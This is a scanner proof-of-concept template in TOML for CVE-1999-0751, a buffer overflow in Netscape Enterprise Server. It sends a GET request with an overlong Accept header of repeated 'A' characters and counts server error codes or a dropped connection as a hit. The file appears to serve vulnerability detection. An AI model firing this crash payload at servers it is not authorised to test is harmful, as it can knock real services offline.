[info]
author = "ave"
description = "验证Netscape企业服务器Accept命令缓冲区溢出漏洞，通过发送超长Accept头触发"
id = "POC-AVE-1999-0450"
name = "CVE-1999-0751 Netscape Enterprise Server Accept Header Buffer Overflow PoC"
severity = "medium"
tags = ["ave-1999-0450"]
vuln_id = [
    "CVE-1999-0751",
    "AVE-1999-0450",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
Accept = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/gif"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    0,
]
type = "status"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = [
    "error",
    "overflow",
    "500",
]
